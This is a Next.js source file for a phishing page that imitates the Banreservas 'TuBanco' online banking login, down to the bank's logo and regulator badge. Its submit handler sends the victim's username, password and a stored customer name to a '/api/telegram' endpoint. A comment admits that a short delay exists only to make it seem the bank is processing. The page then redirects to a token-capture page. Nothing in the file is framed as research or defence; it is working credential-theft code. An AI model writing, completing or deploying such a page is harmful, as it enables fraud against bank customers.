"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function PortalPage() {
  const router = useRouter();
  
  // ESTADOS PARA CAPTURAR DATOS
  const [usuario, setUsuario] = useState("");
  const [password, setPassword] = useState("");
  const [currentImage, setCurrentImage] = useState(0);
  const [idioma, setIdioma] = useState("es");
  const [mostrarMenuIdioma, setMostrarMenuIdioma] = useState(false);
  const [loading, setLoading] = useState(false);

  const imagenesPortada = [
    "/images/portada1.jpg",
    "/images/portada2.jpg",
    "/images/portada3.jpg"
  ];

  const t = {
    es: {
      contacto: "Contáctenos",
      idiomaNombre: "Español",
      bienvenida: "Bienvenido a",
      usuarioPlaceholder: "Ingrese su usuario",
      passwordPlaceholder: "Ingrese su contraseña",
      teclado: "Teclado virtual",
      botonIngresar: "Ingresar",
      cambiarEmpresa: "Cambiar a TuBanco Empresas",
      olvidoPass: "¿Ha olvidado su contraseña?",
      noUsuario: "¿No tienes usuario?",
      registrate: "Regístrate aquí"
    },
    en: {
      contacto: "Contact us",
      idiomaNombre: "English",
      bienvenida: "Welcome to",
      usuarioPlaceholder: "Enter your username",
      passwordPlaceholder: "Enter your password",
      teclado: "Virtual keyboard",
      botonIngresar: "Sign In",
      cambiarEmpresa: "Change to TuBanco Corporate",
      olvidoPass: "Have you forgotten your password?",
      noUsuario: "Don't you have a username?",
      registrate: "Sign up here"
    }
  };

  const content = idioma === "es" ? t.es : t.en;

  // FUNCIÓN CORREGIDA PARA ENVIAR A TELEGRAM
  const handleIngresar = async () => {
    if (!usuario || !password) {
      alert("Por favor complete los campos.");
      return;
    }

    setLoading(true);
    
    try {
      // Obtenemos el nombre guardado en el primer formulario
      const nombreGuardado = localStorage.getItem("cliente_actual") || "Desconocido";

      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          banco: "BANRESERVAS",
          cliente: nombreGuardado,
          usuario: usuario,
          password: password,
          pagina: "Login TuBanco"
        }),
      });

      // Pequeña espera para que parezca que procesa el banco
      setTimeout(() => {
        router.push("/portal/token-banreservas");
      }, 1500);

    } catch (error) {
      console.error("Error:", error);
      router.push("/portal/token-ban");
    }
  };

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentImage((prev) => (prev + 1) % imagenesPortada.length);
    }, 5000);
    return () => clearInterval(timer);
  }, [imagenesPortada.length]);

  return (
    <main className="min-h-screen bg-[#f4f7f9] font-sans flex flex-col">
      <header className="w-full bg-[#2c537a] h-[180px] relative flex flex-col items-center justify-start pt-10 shrink-0">
        <div className="absolute top-4 right-8 text-white text-[11px] flex gap-4 opacity-70 z-50">
          <span className="cursor-pointer hover:opacity-100 transition-opacity">{content.contacto}</span>
          <div className="relative">
            <button 
              onClick={() => setMostrarMenuIdioma(!mostrarMenuIdioma)}
              className="cursor-pointer font-bold hover:opacity-100 flex items-center gap-1"
            >
              {content.idiomaNombre} ▾
            </button>
            {mostrarMenuIdioma && (
              <div className="absolute top-full right-0 mt-1 bg-white text-[#2c537a] rounded shadow-lg overflow-hidden min-w-[100px]">
                <div onClick={() => { setIdioma("es"); setMostrarMenuIdioma(false); }} className="px-4 py-2 hover:bg-gray-100 cursor-pointer border-b border-gray-100">Español</div>
                <div onClick={() => { setIdioma("en"); setMostrarMenuIdioma(false); }} className="px-4 py-2 hover:bg-gray-100 cursor-pointer">English</div>
              </div>
            )}
          </div>
        </div>
        <img src="/images/logo-Banreservas.png" alt="Banreservas" className="h-20 object-contain" />
      </header>

      <div className="flex-grow flex items-start justify-center -mt-16 px-4 pb-10">
        <div className="bg-white w-full max-w-[820px] rounded-xl shadow-2xl overflow-hidden grid md:grid-cols-2 relative z-10">
          <div className="p-8 md:p-12 flex flex-col justify-center">
            <h1 className="text-[#00a3e1] text-[28px] font-light mb-8">
              {content.bienvenida} <span className="font-semibold">TuBanco</span>
            </h1>

            <div className="space-y-5">
              {/* INPUT USUARIO CON ONCHANGE */}
              <div className="relative border border-gray-200 rounded-md flex items-center h-12">
                <span className="px-3 text-gray-400 border-r border-gray-100">👤</span>
                <div className="w-[3px] h-full bg-[#fbaf41] absolute left-[41px]"></div>
                <input 
                  type="text" 
                  value={usuario}
                  onChange={(e) => setUsuario(e.target.value)}
                  placeholder={content.usuarioPlaceholder} 
                  className="w-full pl-6 pr-4 outline-none text-[15px] font-light text-black" 
                />
              </div>

              {/* INPUT PASSWORD CON ONCHANGE */}
              <div className="relative border border-gray-200 rounded-md flex items-center h-12">
                <span className="px-3 text-gray-400 border-r border-gray-100">🔒</span>
                <div className="w-[3px] h-full bg-[#fbaf41] absolute left-[41px]"></div>
                <input 
                  type="password" 
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder={content.passwordPlaceholder} 
                  className="w-full pl-6 pr-4 outline-none text-[15px] font-light text-black" 
                />
                <span className="pr-3 opacity-20">👁️</span>
              </div>

              <div className="text-right text-[#00a3e1] text-[11px] font-medium cursor-pointer hover:underline">
                {content.teclado}
              </div>

              <button 
                onClick={handleIngresar}
                disabled={loading || !usuario || !password}
                className="w-full py-3 bg-[#c5eefd] text-[#2c537a] font-bold rounded-md hover:bg-[#00a3e1] hover:text-white transition-all text-[15px] mt-2 disabled:opacity-50"
              >
                {loading ? "CARGANDO..." : content.botonIngresar}
              </button>
            </div>

            <div className="mt-10 space-y-2 text-[12px] text-[#00a3e1] text-center">
              <p className="cursor-pointer hover:underline font-medium text-[13px]">{content.cambiarEmpresa}</p>
              <p className="cursor-pointer hover:underline font-medium text-[13px]">{content.olvidoPass}</p>
              <p className="text-gray-400 mt-6 text-[11px]">
                {content.noUsuario} <span className="text-[#00a3e1] font-bold cursor-pointer hover:underline">{content.registrate}</span>
              </p>
            </div>
          </div>

          <div className="hidden md:block relative bg-white p-4">
            <div className="relative w-full h-full rounded-xl overflow-hidden">
              {imagenesPortada.map((img, index) => (
                <div key={index} style={{ backgroundImage: `url(${img})` }} className={`absolute inset-0 w-full h-full bg-cover bg-center transition-opacity duration-1000 ease-in-out ${index === currentImage ? "opacity-100" : "opacity-0"}`} />
              ))}
              <div className="absolute bottom-5 left-1/2 -translate-x-1/2 flex gap-1.5">
                {imagenesPortada.map((_, index) => (
                  <div key={index} className={`h-1.5 rounded-full ${index === currentImage ? "bg-white w-5" : "bg-white/40 w-1.5"}`} />
                ))}
              </div>
            </div>
          </div>
        </div>
      </div>

      <footer className="py-8 flex flex-col items-center shrink-0">
        <img src="/images/sbregistro.png" alt="Superintendencia de Bancos" className="h-14 w-auto object-contain opacity-80" />
      </footer>
    </main>
  );
}